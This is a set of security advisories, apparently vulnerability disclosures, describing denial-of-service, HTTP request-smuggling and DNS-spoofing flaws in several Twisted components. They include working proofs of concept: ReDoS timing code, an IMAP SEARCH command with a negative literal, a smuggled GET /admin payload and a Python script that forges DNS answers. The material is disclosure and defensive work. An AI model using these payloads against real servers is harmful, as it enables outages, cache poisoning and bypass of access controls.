### Summary `wildcardToRegexp()` in `twisted/mail/imap4.py` converts IMAP LIST/LSUB wildcard patterns to Python regular expressions.  It substitutes the two IMAP wildcards (`*` → `(?:.*?)` and `%` → `(?:(?:[^\\/])*?)`) but passes every other character through unchanged to `re.compile()`.  This means that an authenticated IMAP client can send a quoted pattern string containing arbitrary regex syntax - including catastrophic-backtracking constructs such as `(a+)+z`.  Because Twisted runs a cooperative, single-threaded reactor, a blocking regex match freezes **all** I/O on the server for the duration of the match.  ---  ## Vulnerable Code  ### `twisted/mail/imap4.py`  ```python # line 4595 def wildcardToRegexp(wildcard, delim=None):     wildcard = wildcard.replace("*", "(?:.*?)")     if delim is None:         wildcard = wildcard.replace("%", "(?:.*?)")     else:         wildcard = wildcard.replace("%", "(?:(?:[^%s])*?)" % re.escape(delim))     return re.compile(wildcard, re.I)   # ← user input compiled verbatim ```  ```python # line 4993 class MemoryAccountWithoutNamespaces:     def listMailboxes(self, ref, wildcard):         ref = self._inferiorNames(_parseMbox(ref.upper()))         wildcard = wildcardToRegexp(wildcard, "/")   # ← user-supplied wildcard         return [(i, self.mailboxes[i]) for i in ref if wildcard.match(i)] ``` ---  ### Proof of Concept  ```python from twisted.mail.imap4 import wildcardToRegexp import time  rx = wildcardToRegexp("(a+)+z", "/") for n in [20, 22, 24, 26, 28]:     victim = "a" * n     t0 = time.perf_counter()     rx.match(victim)     print(f"n={n}: {time.perf_counter() - t0:.3f}s") ```  **Output on Twisted 25.5.0:**  ``` [*] Compiled regex: '(a+)+z' [*] Note: metacharacters ( ) + ? are NOT escaped - they go straight to re.compile()      n        time   ---  ----------    20       0.153s    22       0.651s    24       2.941s    26      14.545s    28      55.019s ```  Timing doubles roughly every two characters (exponential growth), confirming catastrophic backtracking.  ---  ## Impact  Twisted's reactor is single-threaded and cooperative.  A blocking `re.match()` call suspends the entire event loop - no other connection can be accepted, read, or written while the match runs.  A single authenticated LIST command with a 28-character target mailbox name can stall the server for ~55 seconds.  An attacker who can register an account (or obtain credentials through other means) can:  1. `CREATE` a mailbox whose name is an exponential-blowup trigger string. 2. Issue `LIST "" "(a+)+z"` (or equivalent ReDoS pattern). 3. Repeat at ~1-minute intervals to keep the server permanently unavailable.  No exploit code or special privileges beyond an IMAP login are required.  ---  ## Fix  Escape non-wildcard characters before compiling:  ```python def wildcardToRegexp(wildcard, delim=None):     # Split on the two IMAP wildcards, escape everything else     parts = re.split(r'([*%])', wildcard)     result = []     for p in parts:         if p == '*':             result.append('(?:.*?)')         elif p == '%':             if delim is None:                 result.append('(?:.*?)')             else:                 result.append('(?:(?:[^%s])*?)' % re.escape(delim))         else:             result.append(re.escape(p))   # ← escape all other characters     return re.compile(''.join(result), re.I) ```  Alternatively, apply `re.escape()` to the entire wildcard first, then substitute the (now-escaped) `\*` and `\%` tokens back with their regex equivalents.

## Summary  An allocation-without-limits vulnerability (CWE-770) in the Twisted conch telnet transport lets any unauthenticated remote peer exhaust server memory over a single connection. When the peer opens a telnet subnegotiation with `IAC SB` and then streams bytes without ever sending the `IAC SE` terminator, every byte is appended to a per-connection buffer that has no maximum length. The buffer persists across reads and is released only on the terminator the attacker withholds, so it grows without bound until the process is killed.  ## Details  The option-negotiation state machine in `Telnet.dataReceived` enters the `subnegotiation` state on `IAC SB` and sets an empty command list. In that state every non-`IAC` byte is appended to the list with no length check:  ```python # src/twisted/conch/telnet.py  (Telnet.dataReceived) elif self.state == "subnegotiation":     if b == IAC:         self.state = "subnegotiation-escaped"     else:         self.commands.append(b)      # unbounded: no len(self.commands) check ```  `self.commands` is an instance attribute that persists across `dataReceived` calls and is deleted only when `IAC SE` completes the subnegotiation. Negotiation runs at the transport layer before authentication, and the bytes are consumed inside `dataReceived` before any application callback, so an application cannot impose a bound. Twisted caps other parser buffers, for example `NetstringReceiver.MAX_LENGTH`, but not this one.  Affected product: Twisted, `twisted.conch.telnet` transport Affected versions: confirmed against 26.4.0  ## PoC  On any endpoint that exposes the Twisted telnet transport, such as the Twisted manhole telnet service, open one connection and send the two bytes `IAC SB` (`0xFF 0xFA`), then stream any non-`0xFF` bytes continuously and never send the `IAC SE` terminator (`0xFF 0xF0`). No credentials are required, because option negotiation runs before authentication.  Every byte is appended to the per-connection subnegotiation buffer with no maximum, and the buffer is released only by the terminator the attacker withholds, so it grows for the life of the connection. Because each byte is retained as a separate element the memory consumed is several times the traffic sent, so a modest-bandwidth peer, or several such connections, drives the process to memory exhaustion.  ## Impact  This is an unauthenticated remote denial of service (CWE-770, CWE-400) by memory exhaustion. A single connection grows an in-memory buffer without bound at a cost proportional to the bytes sent, amplified by per-byte object overhead, until the operating system kills the server and every service it hosts. There is no confidentiality or integrity impact and no code execution. The affected surface is any deployment that exposes a Twisted telnet or manhole transport to untrusted peers.

## Summary  An infinite-loop vulnerability (CWE-835) in the Twisted IMAP4 server lets an authenticated client freeze the whole process with one small command. `twisted.mail.imap4.parseNestedParens` reads an IMAP literal size with `int()` and never rejects a negative value. A negative size such as `{-100}` drives the parser cursor negative, and because a negative Python index wraps around the end of the string instead of raising, the scanning loop never terminates. It runs synchronously on the single-threaded reactor, so one `SEARCH` command holds the reactor at full CPU forever and every other connection stops being served.  ## Details  Meeting an inline literal, `parseNestedParens` reads the size between the braces and advances the cursor past the body:  ```python # twisted/mail/imap4.py  parseNestedParens literalSize = int(s[i + 1 : end])          # no sign check contentStack[-1].append((s[end + 3 : end + 3 + literalSize],)) i = end + 3 + literalSize                    # negative size -> i goes negative ```  `int(b"-100")` is `-100`, so `i` goes negative; the loop condition `i < len(s)` stays true and `s[i : i + 1]` on a negative index never raises, so the cursor cycles forever. The `_literalStringLimit` guard only covers the synchronizing-literal continuation path, not this inline branch. The call is reached from `select_SEARCH` through `arg_searchkeys`, dispatched only in the selected state, so a valid login and a selected mailbox (any low-privilege account) suffice. It runs in the reactor thread, and the connection timeout cannot fire because the reactor itself is frozen.  Affected product: Twisted (`twisted.mail`), the IMAP4 server `twisted.mail.imap4.IMAP4Server` Affected versions: 26.4.0 and earlier  ## PoC  Log in, select a mailbox, and send a `SEARCH` whose literal size is negative:  ```text C: t1 LOGIN testuser password-test C: t2 SELECT INBOX C: t3 SEARCH {-100}zzzzzzzzzz ```  The server never responds and one core stays at 100 percent. In a measured run a health service co-hosted on the same reactor stopped answering the instant the command arrived, showing the freeze hits the whole process and not just the attacking connection. A valid `{5}zzzzz` completes normally and a non-numeric `{abc}` is rejected with a parse error, which isolates the cause to the missing negative-size check.  ## Impact  A remote denial of service. One command of about ten bytes freezes the single-threaded reactor, so it stops serving not only every other IMAP connection but every other service co-hosted in the same process (for example SMTP and POP3 under `twistd mail`), and no timeout can recover it until the process is restarted. It requires an authenticated session, so any account holder can trigger it; there is no confidentiality or integrity impact and no code execution.

## Summary  An allocation-without-limits vulnerability in the Twisted XML element stream lets any unauthenticated remote peer exhaust server memory over a single stream. When the peer opens a container element and streams child elements without ever closing the container, every element is materialised into an in-memory tree with no limit on depth or child count. An element is released only when its end tag arrives, so a container the attacker never closes retains everything beneath it until the process is killed.  ## Details  In `ExpatElementStream._onStartElement`, each start tag appends a new element to the current element's children and descends into it, with no depth or child-count check:  ```python # src/twisted/words/xish/domish.py  (ExpatElementStream._onStartElement) if self.documentStarted == 1:     if self.currElem != None:         self.currElem.children.append(e)   # append child: no depth/count cap         e.parent = self.currElem     self.currElem = e                      # descend into the new element ```  An element is emitted and dropped only when its end tag arrives while it sits directly under the document root, so a container that is never closed keeps every child beneath it. The transport `XmlStream.dataReceived` feeds bytes to `self.stream.parse(data)` with no size limit, and in XMPP the stream is parsed during negotiation before authentication.  Affected product: Twisted, `twisted.words.xish.domish` element stream Affected versions: confirmed against 26.4.0  ## PoC  On any endpoint that parses untrusted XML streams with this stack, such as an XMPP server, open a stream by sending the opening `stream:stream` tag and a container element, then stream child elements continuously and never send the container's closing tag. No credentials are required, because in XMPP the stream is parsed before authentication.  Every child is appended to the container and retained because the container is never emitted, and the transport applies no limit on the size of the unfinished document. Because each small element becomes a full object in memory the footprint is many times the traffic sent, so a modest-bandwidth peer, or several such streams, drives the process to memory exhaustion.  ## Impact  This is an unauthenticated remote denial of service by memory exhaustion. A single stream grows an in-memory element tree without bound, amplified by per-element object overhead, until the operating system kills the server. There is no confidentiality or integrity impact and no code execution. The affected surface is any deployment that parses untrusted XML streams with this stack, such as an XMPP server or component.

## Summary  An unbounded-buffer vulnerability (CWE-770) in the Twisted words IRC server lets any unauthenticated remote client exhaust server memory. `twisted.words.protocols.irc.IRC.dataReceived` appends every received byte to a per-connection buffer and only removes data at a line feed, with no maximum length. Because `IRC` is a plain `Protocol` and not a `LineReceiver`, one connection that streams bytes without a line feed grows the buffer without bound and drives the whole single-threaded process to out-of-memory, dropping every user at once. The `twistd words` server inherits the method unchanged through `IRCUser`, and the data is buffered before any authentication.  ## Details  `IRC.dataReceived` keeps everything up to the last line feed in `self.buffer`:  ```python # twisted/words/protocols/irc.py class IRC(protocol.Protocol):        # not a LineReceiver, so no MAX_LENGTH     buffer = ""     def dataReceived(self, data):         if isinstance(data, bytes):             data = data.decode("utf-8")         lines = (self.buffer + data).split(LF)         self.buffer = lines.pop()    # no 3line feed -> whole input stays buffered         ... ```  With no line feed in the data, `lines.pop()` returns the entire accumulated content to `self.buffer`, so it grows by every chunk and is never bounded; `IRC` defines no `MAX_LENGTH`, no `lineLengthExceeded`, and no timeout, so the connection is never closed. The `twistd words` server protocol `IRCUser` subclasses `IRC` without overriding `dataReceived`, and the buffer is filled before any `PASS`, `NICK`, or `USER`, so no credentials are required.  Affected product: Twisted (`twisted.words`), `twisted.words.protocols.irc.IRC` and its subclass `twisted.words.service.IRCUser` Affected versions: 26.4.0 and earlier  ## PoC  On a standard Twisted words IRC server (the server `twistd words` runs, using `IRCUser`), an unauthenticated client opens a single TCP connection and continuously sends data that contains no line feed, never completing a line. Every chunk is appended to the connection's line buffer, and because no complete line is ever formed none of it is consumed, so the buffer grows by the full volume sent.  In a measured run against a real `IRCFactory` server, one unauthenticated connection sending 60 MB of line-feed-free data raised the server process resident memory from about 47 MB to 2966 MB (roughly 49 MB per MB sent) with the connection still open and no limit triggered. Sending the same volume as normal line-feed-terminated commands leaves memory flat, which isolates the cause to the missing line-length bound.  ## Impact  An unauthenticated remote denial of service from allocation without limits (CWE-770) leading to uncontrolled resource consumption (CWE-400). A single credential-free connection exhausts the memory of the whole `twistd words` process, and because one process serves every user, the crash drops all connections at once and the service stays down until it is restarted. The quadratic buffer copy reaches the same effect faster. There is no confidentiality or integrity impact and no code execution.

## Summary  An incomplete header-value validation (CWE-444) in the Twisted HTTP server lets a bare carriage return or line feed in a header value hide a following header from the parser. `twisted.web.http.HTTPChannel.headerReceived` rejects a NUL byte in a header value but not a bare CR or LF, even though RFC 9110 section 5.5 requires a recipient to reject all three. Because the channel splits requests only on CRLF, a value carrying a bare LF and a second header arrives as one line, so the second header is folded into the value and the request is framed with no body. A front-end that treats the bare LF as a line terminator frames the request differently, and the disagreement lets an attacker smuggle a request past it. This is an incomplete fix of the earlier Twisted request-smuggling advisories, which guarded the NUL sibling of this exact check.  ## Details  `headerReceived` splits a header line on the first colon, strips space and tab from the value, and validates it with a single test that rejects only NUL:  ```python # twisted/web/http.py  HTTPChannel.headerReceived data = data.strip(b" 	") if b"\x00" in data:          # NUL rejected; a bare CR or LF is not     self._respondToBadRequestAndDisconnect()     return False ```  The channel delimiter is CRLF, so `Foo: x
Content-Length: 39` is one line: the split yields name `Foo` and value `x
Content-Length: 39`, `strip` leaves the LF, and the NUL check passes. `_maybeChooseTransferDecoder` is then called with `Foo`, never sees a `Content-Length`, and installs no body decoder, so the request is framed with an empty body. The header name and request line already reject CR and LF, so the value is the only gap.  Affected product: Twisted, `twisted.web.http.HTTPChannel` Affected versions: 26.4.0 and earlier  ## PoC  Feed one connection a request whose header value carries a bare LF and a `Content-Length`, followed by a second request in the bytes after it: `POST /public HTTP/1.1
Host: v
Foo: x
Content-Length: 44

GET /admin HTTP/1.1
Host: internal

`. Twisted parses two requests and serves both, so the smuggled `GET /admin` returns the /admin response body even though the visible request was only `POST /public`. The bare CR variant behaves identically, and a NUL in the value is rejected, which isolates the missing CR and LF checks.  Behind a front-end that treats the bare LF as a line terminator, the front-end frames one `POST /public` and forwards a body while Twisted frames a second `GET /admin`; the extra response then poisons the shared connection, so a later victim receives the attacker's `GET /admin` response.  ## Impact  This is an HTTP request-smuggling exposure (CWE-444) from inconsistent interpretation of a request (CWE-436). Through a front-end that accepts a bare CR or LF as a line terminator, an attacker can smuggle a request the front-end never sees, bypassing front-end access controls, poisoning a shared connection so a later victim receives the attacker's response, and poisoning a cache. Twisted is the strict endpoint that frames the request without a body, so it is realized only behind such a proxy, and there is no code execution.

### Summary  `twisted.names.dns.DNSDatagramProtocol`, the UDP transport used by twisted's DNS client (`twisted.names.client.Resolver`, `createResolver`, and anything built on it, including MX lookups in `twisted.mail`), accepts a DNS response for a pending query solely on the basis of the 16-bit transaction ID matching. It never checks that the response actually originated from the server the query was sent to. Any host that can deliver a UDP packet to the resolver's listening port with the correct transaction ID can inject a forged answer, independent of the real server's address. This is a materially weaker defense than standard DNS resolver practice (transaction ID plus source-address validation, typically also source-port rotation), and enables off-path DNS response spoofing / cache poisoning.  ### Details  `DNSDatagramProtocol.datagramReceived` (`src/twisted/names/dns.py`, line 3350) is:  ```python def datagramReceived(self, data, addr):     """     Read a datagram, extract the message in it and trigger the associated     Deferred.     """     m = Message()     try:         m.fromStr(data)     except EOFError:         ...     except ValueError as ex:         ...     except BaseException:         ...      if m.id in self.liveMessages:         d, canceller = self.liveMessages[m.id]         del self.liveMessages[m.id]         canceller.cancel()         try:             d.callback(m)         except BaseException:             log.err()     else:         if m.id not in self.resends:             self.controller.messageReceived(m, self, addr) ```  The `addr` parameter, the UDP source address of the datagram, is accepted but never compared against the address the corresponding query was sent to. The only check is `m.id in self.liveMessages`, and `liveMessages` is keyed purely by the transaction ID chosen in `DNSMixin.pickID()`. The listening socket is a plain `listenUDP(0, self, maxPacketSize=512)` (line 3348), not connected to the queried server, so the kernel does not filter by source address either; any host can deliver a UDP datagram to this socket.  The transaction ID itself is generated with `secureRandom` (`randomSource()`, line 174), so it is not predictable, but at 16 bits it is a 1-in-65536 space per attempt. `twisted.names.client.Resolver`, the standard, documented DNS client, mitigates brute-force guessing of that space by creating a brand-new `DNSDatagramProtocol` bound to a fresh, independently random source port (`_connectedProtocol()`, `src/twisted/names/client.py` line 206, using `dns.randomSource()`) for every individual query, and tearing the socket down once the query completes (`_query()`, line 253). This gives an off-path attacker roughly 32 bits of combined entropy (port and transaction ID) to guess per query issued through the standard client, not just the 16 bits of the transaction ID alone.  The missing source-address check is still a real gap for two reasons. First, it removes a defense-in-depth backstop that DNS resolver best practice (RFC 5452) treats as independent from port and ID randomization; an attacker who is on-path, shares a broadcast domain or NAT with the resolver or the real DNS server, or is otherwise able to observe or narrow the ephemeral port faces no additional barrier at all, since source-address validation is exactly the check that would stop them. Second, `DNSDatagramProtocol` is itself a public, documented class; code that constructs one directly and issues more than one query against the same instance, rather than going through `client.Resolver`'s per-query protocol and port cycling, reuses the same source port for every query after the first, so guessing the 16-bit transaction ID alone is sufficient from that point on.  `twisted.names.client.Resolver` uses this same `DNSDatagramProtocol` class for every UDP query it issues, so every consumer of the standard twisted DNS client, including `twisted.mail`'s MX resolution, is subject to the same unauthenticated accept logic in `datagramReceived`, moderated by the per-query port rotation described above.  ### PoC  ```python import socket from twisted.internet import reactor from twisted.names import dns  class CapturingController:     def messageReceived(self, message, protocol, address):         pass  def main():     resolverProto = dns.DNSDatagramProtocol(CapturingController())     resolverProto.startListening()      real_server = ("203.0.113.1", 53)  # RFC 5737 TEST-NET-1, never answers     query = dns.Query(b"victim.example.com", dns.A, dns.IN)     d = resolverProto.query(real_server, [query], timeout=5)      stolen_id = next(iter(resolverProto.liveMessages))     resolver_port = resolverProto.transport.getHost().port      forged = dns.Message(stolen_id, answer=1)     forged.queries = [query]     forged.answers = [         dns.RRHeader(name=b"victim.example.com", type=dns.A, cls=dns.IN, ttl=60,                      payload=dns.Record_A(address="6.6.6.6"))     ]      attacker_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)     attacker_sock.bind(("127.0.0.1", 0))  # unrelated to real_server     attacker_sock.sendto(forged.toStr(), ("127.0.0.1", resolver_port))      def onResult(message):         print("Resolver ACCEPTED forged response as the answer to its query to", real_server)         print("Spoofed A record:", message.answers[0].payload.dottedQuad())         reactor.stop()      d.addCallback(onResult)  reactor.callWhenRunning(main) reactor.run() ```  Output:  ``` Resolver listening on 127.0.0.1:54997, queried ('203.0.113.1', 53), id=6995 Forged response sent from ('127.0.0.1', 53644) (NOT ('203.0.113.1', 53)) Resolver ACCEPTED forged response as the answer to its query to ('203.0.113.1', 53) Spoofed A record: 6.6.6.6 ```  The query was sent to `203.0.113.1:53`, an address reserved by RFC 5737 for documentation and testing that will never respond. The forged response was sent from an unrelated local UDP socket bound to a different, unrelated port. The resolver accepted it as the legitimate answer purely because the transaction ID matched, proving the response's source address plays no role in validation. ### Impact  Any application resolving hostnames through `twisted.names` can have DNS answers forged by a network party able to deliver a UDP packet to the resolver's listening port with the correct transaction ID, and, for the standard `client.Resolver` path, the correct ephemeral source port too. An on-path attacker, or one sharing a broadcast domain or NAT with the resolver or the real DNS server, faces no meaningful barrier at all, since source-address validation is exactly the check that would stop them and it is absent. An off-path attacker targeting the standard `client.Resolver` API must win a roughly 32-bit combined guess (port and transaction ID) within the query timeout window; the same attacker targeting code that uses the public `DNSDatagramProtocol` class directly across multiple queries on one instance, a supported usage pattern, faces only the 16-bit transaction ID space per query after the first. A successful forgery lets an attacker redirect hostname resolution to an address of their choosing, enabling mail interception (spoofed MX/A records), SSRF, or man-in-the-middle positioning against anything that trusts the resolved address.

## Summary  An uncontrolled-resource-consumption vulnerability (CWE-400) in the Twisted HTTP/2 server lets any unauthenticated remote client exhaust server CPU over a single connection. A client that sends a request header block with `END_STREAM` and then immediately resets the stream makes the server route and render the request before it processes the reset. Reset streams are freed and never count against the concurrent-stream limit, and no reset-rate limiter exists, so the pattern can be repeated at line rate on one connection. This is the HTTP/2 Rapid Reset class, CVE-2023-44487.  ## Details  For one received segment the h2 events are processed in order in `H2Connection.dataReceived`. A `HEADERS(END_STREAM)` followed by `RST_STREAM` yields `RequestReceived`, `StreamEnded`, then `StreamReset`, so the request is dispatched and rendered on stream end before the reset is handled:  ```python # src/twisted/web/_http2.py  (H2Connection.dataReceived) for event in events:     if isinstance(event, h2.events.RequestReceived):         self._requestReceived(event)     # allocate the request     elif isinstance(event, h2.events.StreamEnded):         self._requestEnded(event)        # -> requestComplete -> render() synchronously     elif isinstance(event, h2.events.StreamReset):         self._requestAborted(event)      # processed last, frees the stream ```  `_requestAborted` frees the reset stream, so it never occupies the 100-stream concurrency budget, and nothing in `_http2.py` counts or throttles opened-and-reset streams. The 2019 flood fix (GHSA-32gv) bounds outbound control-frame buffering only and does not apply to this path.  Affected product: Twisted, `twisted.web` HTTP/2 server Affected versions: confirmed against 26.4.0  ## PoC  On any Twisted HTTP/2 endpoint, open one connection and, in a tight loop, send a `HEADERS` frame with `END_STREAM` on a fresh stream identifier immediately followed by a `RST_STREAM` for that stream, at line rate. No credentials are required. The server renders each request on stream end before the reset frees the stream, and a freed stream never counts toward the concurrent-stream limit, so the loop is never throttled.  Because every cancelled stream is still dispatched in full and reset streams do not accumulate, the connection is never throttled or closed, so the forced work grows with the number of pairs sent. Sustained on one connection this saturates a CPU core under only a trickle of traffic, whereas a client that instead leaves its streams open is closed once it reaches the concurrent-stream limit.  ## Impact  This is an unauthenticated remote denial of service (CWE-400, CWE-770) by CPU exhaustion. One connection forces unbounded request rendering at a few frames per cancelled request, bypassing the concurrent-stream limit. It is the HTTP/2 Rapid Reset class (CVE-2023-44487), not covered by the earlier Twisted flood fix, with no confidentiality or integrity impact and no code execution.
